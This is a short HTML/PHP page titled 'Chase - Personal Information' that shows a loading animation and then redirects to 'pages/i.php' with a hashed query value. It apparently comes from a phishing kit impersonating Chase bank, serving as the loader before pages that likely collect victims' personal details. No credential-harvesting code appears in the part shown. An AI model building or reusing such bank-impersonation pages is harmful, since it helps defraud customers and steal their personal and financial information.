<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Chase - Personal Information</title>
</head>
<body class="body">
    <div class="container-fluid load-container">
        <img src="https://i.stack.imgur.com/PWt1v.gif" class="load-img">
        <!-- <h1 class="text-white text-center">Loading...</h1> -->
    </div>
</body>
<script src="assets/js/jquery-3.5.1.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script>
    $(() => {
        setTimeout(() => {
            location.href = "pages/i.php?q=<?php echo hash('md5', 'home'); ?>";
        }, 3000);
    });
</script>
</html>